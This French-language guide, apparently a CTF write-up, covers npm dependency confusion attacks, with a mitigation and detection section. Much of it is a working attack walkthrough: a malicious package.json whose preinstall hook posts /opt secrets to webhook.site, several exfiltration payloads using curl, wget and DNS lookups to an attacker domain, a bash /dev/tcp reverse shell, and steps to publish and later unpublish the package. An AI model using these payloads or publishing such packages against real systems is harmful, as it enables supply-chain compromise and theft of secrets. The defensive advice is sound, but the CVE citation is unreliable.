Documentation complète : Dependency Confusion Attack via npm
📋 Table des matières

Vue d'ensemble de la vulnérabilité
Principe de l'attaque
Détection de la vulnérabilité
Exploitation pas à pas
Utilité du webhook
Mitigation et protection
Outils de détection


🎯 Vue d'ensemble de la vulnérabilité
Nom de la vulnérabilité
Dependency Confusion Attack (aussi appelée "Supply Chain Attack" ou "Namespace Confusion")
CVE associé

CVE-2021-22911 (exemple lié à ce type d'attaque)

Principe général
Cette attaque exploite le comportement de résolution de dépendances des gestionnaires de packages (npm, pip, Maven, etc.) qui priorisent parfois les registres publics sur les registres privés.
Impact

Exécution de code arbitraire (RCE) sur le serveur cible
Exfiltration de données sensibles
Compromission de la supply chain
Élévation de privilèges


⚙️ Principe de l'attaque
Comment fonctionne la résolution de dépendances npm ?
Quand un serveur exécute npm install mon-package, npm cherche le package dans cet ordre :

Cache local (node_modules/)
Registry privé (si configuré dans .npmrc)
Registry public (npmjs.com par défaut)

La faille
Si un package privé n'existe pas sur le registry public, un attaquant peut :

Créer un package avec le même nom sur npmjs.com
Lui donner une version plus élevée (ex: 99.0.0 vs 1.0.0)
npm installera la version malveillante au lieu de la version privée

Schéma de l'attaque
┌─────────────────────────────────────────────────────────┐
│ Serveur Victime                                         │
│                                                         │
│ npm install elf-stats-sugarplum-cookiejar-287          │
│        │                                                │
│        ├──► Cherche dans registry privé : NOT FOUND    │
│        └──► Cherche dans npmjs.com : FOUND (v99.0.0)   │
│                                                         │
│ npm install la version malveillante                    │
│        │                                                │
│        └──► Exécute "preinstall" hook                  │
│                  │                                      │
│                  └──► cat /opt/* | curl webhook        │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼
                    ┌──────────────┐
                    │  Webhook.site│
                    │  Reçoit les  │
                    │  données     │
                    └──────────────┘

🔍 Détection de la vulnérabilité
1. Reconnaissance initiale
Indices dans le code source
javascript// Commentaire suspect mentionnant un endpoint debug
// @ElfDev : Dont forget to remove this debug snippet after testing. (DevSecOops)
const packageResponse = await fetch('/api/package');
🚩 Red flag : Endpoint exposant package.json
Analyser le package.json exposé
bashcurl https://target.com/api/package
Recherchez :

Noms de packages inhabituels ou générés automatiquement
Patterns suggérant des packages internes/privés
Messages comme "generated automatically"

2. Vérification sur npmjs.com
Pour chaque package trouvé, vérifiez s'il existe publiquement :
bashnpm view nom-du-package
```

**Si le package n'existe PAS :**
```
npm ERR! 404  'nom-du-package@*' is not in the npm registry.
```

✅ **Vulnérable à Dependency Confusion !**

**Si le package existe :**
```
nom-du-package@1.0.0 | MIT | deps: 3 | versions: 5
⚠️ Vérifiez les versions et l'auteur (pourrait déjà être compromis)
3. Checklist de détection

 Endpoint exposant package.json ou dépendances
 Packages avec noms générés automatiquement
 Tâches cron/automatisées faisant npm install
 Absence de configuration .npmrc restrictive
 Packages privés non publiés avec scope

4. Reconnaissance avancée
bash# Chercher des fichiers de configuration npm
curl https://target.com/.npmrc
curl https://target.com/package-lock.json
curl https://target.com/npm-shrinkwrap.json

# Chercher des endpoints liés aux packages
curl https://target.com/api/packages
curl https://target.com/api/dependencies
curl https://target.com/api/install

💣 Exploitation pas à pas
Étape 1 : Préparation
Créer la structure du package malveillant
bashmkdir malicious-package
cd malicious-package
Créer package.json
json{
  "name": "nom-du-package-cible",
  "version": "99.0.0",
  "description": "Malicious package for security research",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl https://webhook.site/VOTRE-ID -X POST -d \"$(cat /opt/secret.txt 2>&1)\"",
    "postinstall": "echo 'Package installed successfully'"
  },
  "author": "Security Researcher",
  "license": "MIT"
}
Pourquoi version 99.0.0 ?

npm installe la version la plus élevée par défaut
99.0.0 > toute version normale (1.x.x, 2.x.x)

Créer index.js (vide ou minimal)
javascript// Fichier vide ou minimal pour éviter les erreurs
module.exports = {};
Étape 2 : Configuration du webhook
Obtenir une URL webhook

Allez sur https://webhook.site/
Copiez votre URL unique : https://webhook.site/abc123-def456
Remplacez VOTRE-ID dans le package.json

Alternatives :

RequestBin : https://requestbin.com/
Pipedream : https://pipedream.com/
Serveur personnel : nc -lvp 8080

Étape 3 : Publication sur npm
bash# Se connecter à npm
npm login

# Vérifier l'identité
npm whoami

# Publier le package
npm publish

# Vérifier la publication
npm view nom-du-package-cible
Étape 4 : Payloads d'exfiltration
Payload basique (curl)
json"preinstall": "curl https://webhook.site/ID -d \"$(cat /opt/*)\""
Payload avec base64 (éviter les problèmes d'encodage)
json"preinstall": "cat /opt/* | base64 | curl https://webhook.site/ID -d @-"
Payload avec find (recherche récursive)
json"preinstall": "find /opt -type f -exec cat {} \\; | curl https://webhook.site/ID -X POST -d @-"
Payload avec wget (si curl indisponible)
json"preinstall": "wget --post-data=\"$(cat /opt/*)\" https://webhook.site/ID"
Payload avec DNS exfiltration (si HTTP bloqué)
json"preinstall": "cat /opt/secret.txt | xxd -p | xargs -I {} nslookup {}.votredomaine.com"
Payload reverse shell
json"preinstall": "bash -c 'bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1'"
Étape 5 : Attendre l'exécution
Le serveur cible va :

Exécuter npm install (manuellement ou via cron)
Trouver votre package (version 99.0.0)
L'installer
Exécuter le hook preinstall
Envoyer les données à votre webhook

Temps d'attente typique : 2-5 minutes (selon la fréquence du cron)

🌐 Utilité du webhook dans l'attaque
Pourquoi utiliser un webhook ?
Problème : Exécution aveugle
Quand le serveur exécute votre code malveillant, vous n'avez pas accès direct à la sortie des commandes. C'est une exécution à distance sans terminal interactif.
bash# Sur le serveur cible (vous n'y avez pas accès)
$ cat /opt/secret.txt
FLAG{super_secret}

# Comment récupérer cette sortie ? 🤔
```

#### Solution : Exfiltration via HTTP
Le webhook agit comme un **serveur de réception** contrôlé par l'attaquant.
```
Serveur Cible                    Webhook (Attaquant)
     │                                  │
     ├─► cat /opt/secret.txt           │
     │   FLAG{secret}                   │
     │                                  │
     ├─► curl webhook.site -d "FLAG"   │
     │                                  │
     └──────────────────────────────────┤
                                        │
                                 Reçoit: "FLAG{secret}"
Avantages du webhook
AvantageDescriptionPas de reverse shell nécessairePas besoin d'ouvrir de port ou de maintenir une connexionFonctionne derrière firewallLes requêtes HTTP sortantes sont rarement bloquéesLogs automatiqueswebhook.site garde un historique de toutes les requêtesPas d'infrastructurePas besoin de gérer un serveurInterface webConsultation facile via navigateur
Alternatives au webhook
1. DNS Exfiltration
bash# Encode les données en sous-domaines
cat /opt/secret | xxd -p | xargs -I {} nslookup {}.attacker.com
Avantage : Fonctionne même si HTTP/HTTPS est bloqué
Inconvénient : Limité en taille (253 caractères par requête DNS)
2. Serveur personnel (netcat)
bash# Sur votre machine
nc -lvp 8080

# Dans le payload
cat /opt/* | nc VOTRE_IP 8080
Avantage : Contrôle total
Inconvénient : Nécessite une IP publique et un port ouvert
3. Pastebin / Services de partage
bashcurl -X POST -d "$(cat /opt/*)" https://pastebin.com/api/api_post.php
Avantage : Simple
Inconvénient : Traces publiques
4. Écriture dans un fichier accessible
bashcat /opt/* > /var/www/html/output.txt
Puis :
bashcurl https://target.com/output.txt
Avantage : Pas besoin de serveur externe
Inconvénient : Nécessite des permissions d'écriture

🛡️ Mitigation et protection
1. Configuration npm sécurisée
Utiliser un fichier .npmrc restrictif
ini# .npmrc dans le projet
registry=https://registry-interne.entreprise.com/
@entreprise:registry=https://registry-interne.entreprise.com/

# Bloquer le registry public
# registry.npmjs.org/:_auth=false
Configuration au niveau système
bashnpm config set registry https://registry-interne.com/
2. Utiliser des scopes pour les packages privés
Mauvais (vulnérable) :
json{
  "dependencies": {
    "mon-package-interne": "1.0.0"
  }
}
Bon (protégé) :
json{
  "dependencies": {
    "@mon-entreprise/mon-package-interne": "1.0.0"
  }
}
Les packages avec scope @mon-entreprise/ ne seront jamais cherchés sur npmjs.com.
3. Verrouiller les versions avec package-lock.json
bash# Générer un lock file
npm install

# Commit package-lock.json
git add package-lock.json
git commit -m "Lock dependencies"

# Utiliser ci pour respecter strictement le lock
npm ci  # Au lieu de npm install
4. Outils de sécurité
Socket.dev
bashnpx socket npm install
Détecte les packages malveillants avant installation.
npm audit
bashnpm audit
npm audit fix
Vérifie les vulnérabilités connues.
Snyk
bashnpm install -g snyk
snyk test
Analyse les dépendances pour les failles de sécurité.
5. Monitoring et détection
Surveiller les installations suspectes
bash# Logs npm
npm config set loglevel verbose

# Alertes sur versions inattendues
npm outdated
Auditer les hooks npm
bash# Lister tous les scripts
cat package.json | jq '.scripts'

# Chercher des commandes suspectes
grep -r "preinstall\|postinstall" node_modules/*/package.json
6. Bonnes pratiques organisationnelles

 Bloquer l'accès à npmjs.com au niveau firewall pour les serveurs de production
 Whitelister uniquement les packages autorisés
 Utiliser un proxy npm interne (Verdaccio, Artifactory, Nexus)
 Scanner les packages avant déploiement
 Limiter les permissions d'exécution des scripts npm
 Auditer régulièrement les dépendances

7. Protection au niveau CI/CD
yaml# .gitlab-ci.yml / .github/workflows
before_script:
  - npm config set registry https://registry-interne.com/
  - npm config set strict-ssl true
  - npm audit --audit-level=high

🔧 Outils de détection
1. Outils automatisés
Dependency-Check (OWASP)
bashdependency-check --project "Mon Projet" --scan ./package.json
Retire.js
bashnpm install -g retire
retire --path ./
npm-check
bashnpx npm-check -u
2. Scripts personnalisés
Vérifier l'existence des packages sur npmjs.com
bash#!/bin/bash
# check-packages.sh

while IFS= read -r package; do
  if npm view "$package" > /dev/null 2>&1; then
    echo "✅ $package existe sur npmjs.com"
  else
    echo "❌ $package N'EXISTE PAS (vulnérable!)"
  fi
done < <(jq -r '.dependencies | keys[]' package.json)
Détecter les versions suspectes
bash#!/bin/bash
# detect-suspicious-versions.sh

npm outdated --json | jq -r 'to_entries[] | 
  select(.value.current != .value.wanted) | 
  "\(.key): current=\(.value.current) vs wanted=\(.value.wanted)"'
3. Burp Suite extensions

Logger++ : Capturer toutes les requêtes vers /api/package, /api/stats
Param Miner : Découvrir des paramètres cachés
ActiveScan++ : Détecter les injections

4. Reconnaissance manuelle
bash# Chercher des endpoints exposant des informations
ffuf -w wordlist.txt -u https://target.com/api/FUZZ

# Wordlist exemple
package
packages
dependencies
deps
npm
install
build
deploy
```

---

## 📝 Checklist complète d'exploitation

### Phase 1 : Reconnaissance
- [ ] Identifier un endpoint exposant `package.json`
- [ ] Récupérer le nom complet du package
- [ ] Vérifier si le package existe sur npmjs.com (`npm view`)
- [ ] Identifier la fréquence d'installation (logs, timing)

### Phase 2 : Préparation
- [ ] Créer un compte npm (npmjs.com/signup)
- [ ] Configurer un webhook (webhook.site)
- [ ] Préparer le payload d'exfiltration
- [ ] Créer `package.json` avec version élevée (99.0.0)
- [ ] Créer `index.js` minimal

### Phase 3 : Exploitation
- [ ] Se connecter à npm (`npm login`)
- [ ] Publier le package (`npm publish`)
- [ ] Vérifier la publication (`npm view nom-package`)
- [ ] Surveiller le webhook

### Phase 4 : Post-exploitation
- [ ] Récupérer les données exfiltrées
- [ ] Documenter la vulnérabilité
- [ ] Nettoyer : `npm unpublish nom-package --force`
- [ ] Rapporter la faille (si bug bounty/pentest)

---

## 🎓 Cas d'étude réels

### 1. Alex Birsan (2021) - $130,000 en bug bounties

**Cibles :** Microsoft, Apple, PayPal, Tesla, Netflix, Uber, etc.

**Technique :**
- Identification de packages privés via GitHub
- Publication de packages homonymes sur npmjs/PyPI
- Exfiltration de données via DNS

**Impact :** Exécution de code sur des milliers de serveurs

### 2. Attaque contre ua-parser-js (2021)

**Incident :** Package légitime compromis (35M téléchargements/semaine)

**Payload :** Cryptominer + voleur de mots de passe

**Leçon :** Même les packages légitimes peuvent être compromis

### 3. Event-Stream (2018)

**Incident :** Backdoor ajoutée dans une dépendance populaire

**Payload :** Vol de clés Bitcoin

**Leçon :** Auditer les dépendances transitives

---

## 🔗 Ressources supplémentaires

### Articles de référence
- [Original Dependency Confusion Blog Post - Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [OWASP Dependency Confusion](https://owasp.org/www-community/attacks/Dependency_Confusion)
- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)

### Outils
- [Socket.dev](https://socket.dev/) - Détection de packages malveillants
- [Snyk](https://snyk.io/) - Scanner de vulnérabilités
- [Verdaccio](https://verdaccio.org/) - Proxy npm privé

### Labs et CTF
- [TryHackMe - Dependency Confusion](https://tryhackme.com/)
- [HackTheBox - Supply Chain Challenges](https://www.hackthebox.com/)
- [Root-Me - Web Challenges](https://www.root-me.org/)

---

## 📊 Résumé graphique
```
┌─────────────────────────────────────────────────────────────┐
│              DEPENDENCY CONFUSION ATTACK                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. RECONNAISSANCE                                           │
│     └─► Trouver endpoint exposant package.json              │
│                                                              │
│  2. VÉRIFICATION                                             │
│     └─► npm view package-name (n'existe pas?)               │
│                                                              │
│  3. CRÉATION                                                 │
│     ├─► package.json avec version élevée (99.0.0)           │
│     ├─► Hook preinstall avec payload malveillant            │
│     └─► index.js minimal                                    │
│                                                              │
│  4. PUBLICATION                                              │
│     └─► npm publish sur npmjs.com                           │
│                                                              │
│  5. EXFILTRATION                                             │
│     ├─► Serveur cible installe le package                   │
│     ├─► Hook s'exécute                                      │
│     └─► Données envoyées au webhook                         │
│                                                              │
│  6. NETTOYAGE                                                │
│     └─► npm unpublish --force                               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
